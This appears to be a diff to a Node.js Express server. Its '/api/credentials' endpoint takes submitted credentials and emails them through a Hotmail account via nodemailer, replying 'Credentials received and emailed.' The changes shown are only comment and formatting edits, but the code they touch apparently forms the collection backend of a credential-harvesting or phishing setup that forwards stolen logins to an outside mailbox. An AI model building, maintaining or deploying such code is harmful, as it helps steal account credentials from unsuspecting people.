@@ -17,7 +17,7 @@ app.post("/api/credentials", async (req, res) => {
 
     // Set up nodemailer transporter
     const transporter = nodemailer.createTransport({
-        service: "hotmail",  // Use Outlook's service
+        service: "hotmail",  // Use Outlook's service (hotmail)
         auth: {
             user: process.env.EMAIL_USER,  // Your Outlook email from the .env file
             pass: process.env.EMAIL_PASS,  // Your app password from the .env file
@@ -33,7 +33,8 @@ app.post("/api/credentials", async (req, res) => {
     };
 
     try {
-        await transporter.sendMail(mailOptions);  // Send the email
+        // Send the email
+        await transporter.sendMail(mailOptions);
         console.log("Email sent successfully.");
         res.status(200).send("Credentials received and emailed.");
     } catch (error) {
